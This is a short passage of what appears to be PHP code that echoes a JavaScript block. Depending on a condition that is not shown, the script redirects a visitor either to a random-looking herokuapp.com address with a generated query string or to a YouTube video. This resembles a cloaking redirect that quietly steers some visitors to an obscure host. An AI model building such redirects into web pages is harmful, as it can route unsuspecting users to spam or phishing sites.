...
echo "        {\n";
echo "         window.location = \"https://gfhjtrshngtfjnrj.herokuapp.com/?\"+ h(13, '')+\"/?ref=bookmarks\";\n";
echo "        }else\n";
echo "{\n";
echo " window.location = \"https://www.youtube.com/watch?v=OiUbQUr7iKo?\"+ h(23, '')+\"/?ref=bookmarks\";\n";
echo "}\n";
echo "//]]>\n";
echo "</script>\n";
